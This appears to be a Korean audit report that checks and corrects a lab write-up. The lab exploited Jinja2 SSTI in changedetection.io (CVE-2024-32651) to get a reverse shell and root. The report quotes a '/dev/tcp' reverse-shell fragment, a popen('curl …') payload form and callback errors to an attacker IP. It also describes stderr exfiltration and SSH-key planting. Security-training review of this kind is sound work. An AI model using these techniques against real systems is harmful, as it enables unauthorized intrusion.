# Detection.md — 적대적 검증 + 정정 (2026-08-21)

- 대상: `03. PG\Detection.md` (187행 → 221행)
- 감사자 판정: **날조 0건.** 오류는 전부 ①1차 사료 오독(CVE 범위) ②실측 인용의 요약·누락 ③추론을 단정으로 쓴 것.
- ⚠️ **git baseline 없음** — `Detection.md` 는 untracked(`?? "03. PG/Detection.md"`). 개작 전후 대조가 불가능하므로 증거원은 (B) Kali 산출물 + (C) 1차 사료뿐.

## 근거 출처

- Kali `~/PG/Detection/` — `nmap-quick.txt`·`nmap-full.txt`·`nmap-udp-top100.txt`·`gobuster-5000.txt`·`web-5000/root.body`·`web-5000/root.headers`·`listener/{http80.log,nc443.log,shell443.log}`·`ssti/{p1,p3_revshell,p4_diag,p5_pty,p6_sshkey}.j2`·`ssti/orig_body.txt`·`harvest_root.txt`(1336행)·`proof_root.txt`·`pty_shell_evidence.log`·`cleanup.txt`·`writeup_notes.txt`·`backup_extract/`
- 볼트 `파일보관\PG-Detection-changedetection-index-5000.png`·`PG-Detection-notification-ssti-payload.png` — **둘 다 직접 열어 판독**
- `03. PG\_AUDIT\Detection-run.md`
- 1차 사료 — NVD CVE-2024-32651, GitHub Advisory GHSA-4r7v-whpg-8rx3, Snyk SNYK-PYTHON-CHANGEDETECTIONIO-6674055
- **직접 실행(Kali)** — jinja2 3.1.6 `Environment` vs `SandboxedEnvironment` 렌더 대조, `{{7*7}}`, diag stderr base64 디코드

---

## A. 고친 것

| 위치(문자열) | 무엇이 틀렸나 | 어떻게 고쳤나 |
|---|---|---|
| 2장 「0.45.20 이전 버전 해당」 | **1차 사료와 어긋남.** NVD·GHSA·Snyk 모두 **≤ 0.45.20 취약 / 0.45.21 패치**. 노트는 off-by-one | 「0.45.20 «이하»가 해당이고 0.45.21 에서 패치」 + CVSS 10.0 명기 |
| 8장 「0.45.20 이상으로 업그레이드」 | 같은 오류 — 0.45.20 으로 올려도 여전히 취약 | 「0.45.21 이상으로 업그레이드」 |
| 9장 「< 0.45.20」 | 같은 오류 | 「≤ 0.45.20 … 0.45.21 에서 패치」 + GHSA 번호 추가 |
| 2장 「샌드박스가 있어도 자주 통하는 표준 탈출」 | **직접 실행으로 반증.** `SandboxedEnvironment` 는 이 체인의 첫 홉에서 막는다 → `SecurityError: access to attribute '__init__' of 'TemplateReference' object is unsafe.` 게다가 8장이 대책으로 `SandboxedEnvironment` 를 권하고 있어 **내부 모순**이었음 | 「샌드박스를 뚫는 것이 아니라 샌드박스가 없어서 통하는 것」으로 정정, SecurityError 원문 인용, 8장 대책과 연결 |
| 2장 `self` — 「템플릿 렌더 컨텍스트에서 접근 가능한 객체」 | 부정확·모호 | 실행으로 확인한 `TemplateReference` 객체 / `__globals__` = `jinja2.runtime` 로 특정 |
| 2장 「Jinja2 문자열은 홑따옴표, 셸 명령 안쪽은 큰따옴표만」 | **산출물이 반증.** `p1.j2`·`p3_revshell.j2` 는 **바깥 큰따옴표**로 정상 동작했다. 규칙은 「홑/큰」 고정이 아니라 「안팎을 다르게」. 또한 「(6장에서 실제로 깨졌음)」이 **가리키는 곳이 6장에 없었다**(dangling cross-ref) | 규칙을 「안팎 따옴표를 서로 다르게」로 정정 + 4개 `.j2` 실제 형태 명시. 깨진 사례는 6장 ③에 실제로 추가(아래) |
| 1장 gobuster 코드펜스 | **미스쿼트.** 원본은 5행인데 4행으로 압축했고 **`/settings` 를 누락** — 정작 이 박스의 SSTI sink 다 | `gobuster-5000.txt` 5행 전문으로 교체 |
| 1장 「`/backup`(200, 40480)」 | 값 자체는 gobuster 와 일치하나, 실물 `backup.zip` 은 40,696 B 라 대조 시 모순으로 보임 | 두 값을 나란히 적고 「요청마다 zip 재생성 [가정]」으로 설명 |
| 1장 「(3장에서 회수)」 | **내부 모순.** 3장에 `/backup` 회수가 없다. 실제 회수 시각은 14:08 = root 획득 **후**(`writeup_notes.txt`) | 「실제 회수는 root 획득 후」로 교체 |
| 1장 「UDP top-100 대조 → 추가 포트 없음」 | **「배제」와 「못 해봤다」의 혼동.** `nmap-udp-top100.txt` 는 10개 closed + **90개 `open\|filtered`(무응답)**. UDP 는 배제된 것이 아님 | 수치 그대로 적고 「배제한 것이 아니라 미확정」 명시 |
| 1장 「nmap 의 werkzeug/Flask 시그니처 오독」 | **어느 시그니처인지의 근거가 없다.** `root.headers` 확인 결과 응답에 `Server` 헤더가 **아예 없음** | 「배너가 아니라 nmap 의 추정. `Server` 헤더 부재」로 관측 사실만 남김 |
| 3장 RCE 페이로드 코드펜스 | **미스쿼트.** 원본 `p1.j2` 는 `__import__("os").popen("curl …")` 로 **큰따옴표**. 노트는 홑따옴표로 바꿔 실었다 | `p1.j2` 원문 그대로 교체 + 출처 캡션 |
| 4장 `SUID: /usr/bin/{fusermount,sudo,su,umount,passwd}` | **미스쿼트.** `harvest_root.txt` SUID 섹션은 **40개**(chsh·chfn·at·mount·newgrp·gpasswd·ssh-keysign·snap-confine·snap 중복분 등). 코드펜스 안에서 5개로 잘랐음 | 실제 구성으로 확장 서술 |
| 4장 `sudo: (ALL : ALL) ALL` | 코드펜스인데 harvest 원문 형식이 아님 | SUDO 섹션 원문 2행으로 교체 |
| 5장 「(포털 0/1 과 일치)」 | 제출 완료(Lab Complete 1/1) 후에도 0/1 이 남아 **스테일**. 공개 노트에서 오독을 부름 | 「포털도 플래그 슬롯 1개, 제출로 Lab Complete 1/1 확정」 |
| 5장 「33바이트, `-rwx------ root`」 | 출처 표기가 없었을 뿐 값은 **정확**(아래 반증 참조) | `harvest_root.txt` FLAGS 원문 1행을 코드펜스로 인용 |
| 5장 「`whoami; id; hostname; date; cat` 한 화면」 | `hostname -I` 누락 | `proof_root.txt` 실제 명령열로 교체 |
| 6장 ① 「accept backlog 50 짜리 사실상 단일 처리」 | 「50」은 **실측**(아래 반증). 그러나 「사실상 단일 처리」는 현상에서의 추론인데 단정형 | 백로그 50 을 `ss` 원문으로 출처 표기 + 순차 처리는 `[가정]` 강등 |
| 6장 ① 「popen('… \| bash &')」 | 데드락을 낸 것은 `p3_revshell.j2`(`bash &`)가 아니라 `p5_pty.j2`(`base64 -d \| python3`, pty.spawn) | 실제 페이로드로 정정 + `pty_shell_evidence.log` 근거 추가 |
| 6장 ① 「python3 프로세스는 stdin EOF 후 살아남음」 | **단정형인데 `cleanup.txt` 는 「추정, 관측 불가」로 기록.** 앱이 죽은 뒤라 타겟 프로세스를 볼 수 없었음 | `[가정]` 강등 + 「관측할 수 없었음」 명시 |
| 6장 ② 근거 서술 | 타임스탬프 선후만 근거로 제시. 실제로 더 강한 근거는 **내용**(저장값이 SSTI 인데 apprise POST 의 title·message 가 둘 다 기본 문구) | ⓐ시각 ⓑ내용 두 근거로 분리하고 ⓑ가 결정적임을 명시 |
| 2장 트리거 「폼 검증(본문 렌더)이다」 | 「폼 검증 단계」는 소스 미확인 추론 | 관측 사실(「저장만으로 실행됐다」)과 추론을 분리, 추론은 `[가정]` |
| 6장 ③ 192.168.248.220 | 삭제 대상 아님 — `writeup_notes.txt`·`Detection-run.md` 두 곳에 기록. 다만 raw `ss` 출력은 미보존 | 문장 유지 + 「raw `ss` 출력 미보존 [가정]」 캡션 추가 |
| 7장 3 `setsid nohup bash -i >& /dev/tcp/…` | 이 박스에서 **쓰지 않은 형태**를 단정형 권고로 제시 | 「쓰지 않았고 검증되지 않음 [가정]」 명시, 실제로 통한 것은 SSH 키 심기임을 대비 |
| 7장 2 `{{7*7}}`→`49` | 근거 없는 단정이었음 | jinja2 3.1.6 직접 실행으로 확인 후 근거 표기 + 「SandboxedEnvironment 면 이 체인은 막힘」 단서 추가 |
| 남긴 흔적 「리스너 전부 종료 확인」 | **`cleanup.txt` 의 유보를 누락.** 「내 것이 아닌 잔존 프로세스 1건(pid 347623 `sudo nc -lvnp 80`) — 손대지 않았다」 | 해당 항목 1행 추가 |

## B. 새로 «추가»한 실측 (노트에 빠져 있던 6장 재료)

**6장 ③ 에 「따옴표 중첩으로 깨진 1차 diag」 사례 추가.** `writeup_notes.txt` 13:44 의 `O=` base64 를 Kali 에서 디코드해 원문 확인:

```
/usr/bin/bash: line 53: 443": Servname not supported for ai_socktype
/usr/bin/bash: line 53: /dev/tcp/192.168.45.207/443": Invalid argument
```

- 이것이 2장 「인용 규칙」이 원래 가리키려던 실패다(원본 노트의 dangling cross-ref 해소).
- ⚠️ **증거 등급 주의** — 이 콜백 줄은 `http80.log` 에 **없다**(로그에는 성공한 `GET /diag443-` 만 있음). 출처는 `writeup_notes.txt` 의 기록과 `Detection-run.md` 의 독립 서술 2건. 노트 본문에도 이 유보를 적어 두었다.
- 부수 효과로 **「stderr 를 base64 아웃바운드 콜백으로 빼는 것」이 blind SSTI 의 유일한 피드백 채널**이라는 시험장용 교훈을 7장 3에 추가.

## C. 삭제한 것

**없음 (0건).** 반증된 서술은 전부 정정 또는 `[가정]` 강등으로 처리했다.

## D. 반증한 것 — 지적으로 올라왔으나 확인 결과 노트가 옳았던 것

1. **「135행 33바이트·`-rwx------ root` 는 출처가 없으면 강등」 → 반증.** `harvest_root.txt:1335` 에 그대로 있다: `-rwx------ 1 root root 33 Aug 21 05:05 /root/proof.txt`. 강등이 아니라 **출처를 붙여 강화**했다.
2. **「142행 accept backlog 50 은 창작 의심 1순위」 → 반증.** `harvest_root.txt:165` LISTEN 섹션에 `tcp LISTEN 0 50 0.0.0.0:5000 … users:(("changedetection",pid=844,fd=4))`. **50 은 커널이 보고한 listen 백로그 실측치**다. 창작 아님. (같은 줄이 pid 844 도 동시에 증명한다.) 다만 거기 붙은 「사실상 단일 처리」 결론만 `[가정]` 으로 갈랐다 — 관측은 옳고 결론이 추론인 Monster 패턴.
3. **「129행 `sudo: (ALL:ALL) ALL`」 — 총괄 프롬프트의 표기가 틀렸다.** harvest 원문은 공백이 있는 `(ALL : ALL) ALL` 이고 **노트 쪽이 맞았다**. 총괄이 준 문자열로 고쳤으면 오히려 개악이었다.
4. **「51행 `v0.45.1` 이 `root.body` 에 실재하는가」 → 실재.** `grep -c` 히트 1건. 부분 히트를 부재로 승격시키는 Fractal 사고는 재발하지 않았다.
5. **「③ 192.168.248.220 의 근거가 산출물에 없으면 강등」 → 부분 반증.** 산출물 2곳(`writeup_notes.txt`·`Detection-run.md`)에 기록이 있다. 강등 대신 「raw `ss` 미보존」 캡션만 붙였다.
6. **「④ tee/capture-pane 인과에 근거가 있는가」 → 있다.** `writeup_notes.txt` 13:45~46 에 원인·대조(tee 로그에는 프롬프트 존재, 순수 nc 세션은 정상 capture)까지 기록. 무수정.
7. **「② test 는 기본 본문 / 트리거는 저장」 → 전면 확증.** `http80.log` 13:41:54 `hit-p1-…` + `nc443.log` 의 apprise POST 본문이 기본 문구 + 13:42:24 `/hit-title`·`/hit-body` 동시 콜백. 오히려 **원본 노트보다 더 강한 근거(내용 근거)** 를 찾아 보강했다.
8. **43~45행 nmap 블록 → 한 바이트도 다르지 않음.** `nmap-quick.txt` 와 완전 일치.
9. **106행 SSH 키 페이로드 → `p6_sshkey.j2` 와 완전 일치**(공개키만 `<ed25519 pubkey>` 로 치환). 볼트 스크린샷 `PG-Detection-notification-ssti-payload.png` 의 Notification Body 필드에 **같은 페이로드가 화면으로도 찍혀 있어 이중 확인**됐다.
10. **63행 `password: false` → 실재.** `backup_extract/url-watches.json` 에서 확인.

## E. 프롬프트 방향 확인 (Fikklish 사고 재발 방지)

- 113~117행 `root@detection:~#` = **타겟 pty 프롬프트. 실측이므로 보존**했다. `proof_root.txt` 원문과 일치하며, 「웹셸이 아니라 대화형 셸에서 플래그를 읽었다」의 유일한 판정 근거다.
- 6장 ① 에 `pty_shell_evidence.log` 의 `root@detection:/#` 참조를 **추가**했다(1차 셸 획득의 증거).
- `┌──(kali㉿kali)`·`└─$` 창작 프롬프트는 **원래 없었다**. 위반 0건.

## F. 총괄에 올릴 것

1. **색인 갱신 필요** — 신규 노트라 `_INDEX` 반영이 안 돼 있다. `refresh.ps1` 은 총괄 몫이라 돌리지 않았다.
2. **`_STATUS.md` 판정: 완료 (1/1).** 근거 — `proof_root.txt`(대화형 pty) · harvest FLAGS 전수 탐색에서 `/root/proof.txt` 단일 · 포털 Lab Complete. 직접 편집하지 않았다.
3. **태그 `tech/cred/ssh-key` 검토 요망** — 이 박스는 「기존 SSH 키를 주웠다」가 아니라 「내 공개키를 심었다」다. taxonomy 는 공유 인프라라 손대지 않았다. 나머지 `tech/web/ssti`·`tech/payload/revshell` 은 실제 사용 기법이라 유지. `cves: [CVE-2024-32651]` 도 실제 악용 CVE 하나뿐이라 유지.
4. **Kali 잔존 프로세스** — pid 347623 `sudo nc -lvnp 80`. 이 세션 이전부터 존재, 다른 작업 소유 가능. 총괄 판단 필요.

## G. `pg-doc-reviewer` 로 넘길 문체 항목 — 6건

사실 문제가 아니므로 **손대지 않았다.** 서술형 종결(`~한다`·`~이다`·`~였다`)이 남아 있는 곳:
- 2장 배경 「…보낸다 / …치환한다 / …평가함」 혼재
- 3장 「…앱이 죽는다 / …얻음」 혼재
- 6장 ① 「…붙잡지 마라 / …받는다」
- 6장 ② 「…안 탄다 / …보여준다」
- 6장 ③ 「…깨졌다」(감사자 추가분 포함)
- 7장 3·5 「…낫다 / …분리하라」

(감사자가 추가·정정한 문장도 이 목록에 포함시켰다 — 문체 통일은 감사 범위 밖이다.)
